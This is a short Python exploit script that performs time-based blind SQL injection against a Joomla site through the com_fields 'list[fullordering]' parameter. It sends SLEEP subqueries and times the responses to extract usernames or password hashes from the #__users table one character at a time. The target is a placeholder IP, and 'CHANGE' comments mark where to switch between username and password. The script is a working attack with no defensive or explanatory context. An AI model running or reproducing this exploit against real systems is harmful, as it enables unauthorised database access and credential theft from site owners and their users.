#!/usr/bin/env python3                                                                                     [1/304]
                            
import sys                                                                                                        
import time
import urllib
import requests


IP = "10.0.0.0"

row_count_q = "(select sleep(5) from dual where (SELECT COUNT(1) FROM #__users)={})"
entry_length = "(select sleep(5) from dual where ((SELECT LENGTH({}) FROM #__users LIMIT 1 OFFSET 0))={} limit 1)"
character_check = "(select sleep(5) from dual where substring((SELECT {} FROM #__users LIMIT 1 OFFSET 0),{},1)=BIN
ARY {} limit 1)"

characters = list(range(32,127))

base_url = 'http://{}'.format(IP)

# Set the cookie for the session
r = requests.get(base_url)
headers = {'Cookie':r.headers['Set-Cookie'].split()[0]}
base_url = base_url + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="

# Check the row count for users

# Check each row for username length and password length

# Define functions
def call_url(check_url):
    r = requests.get(check_url,headers=headers)
    if not r.ok:
        print("Error")
        sys.exit()

def time_call(check_url):
    start = time.time()
    call_url(check_url)
    stop = time.time()
    return stop - start

# Iterate user/pass
data = []
for position in range(5): #CHANGE range 
    position = position + 1
    print ("Checking character {}".format(position))
    for character in characters:
        check_url = base_url + urllib.parse.quote(character_check.format('username',position,hex(character))) #CHANGE username/password
        if time_call(check_url) > 3:
            # recheck if really takes longer or not internet issues
            if time_call(check_url) > 3:
                data.append(chr(character))
                break

x = ""
for i in range(len(data)):
    x = x + data[i]

print (x)
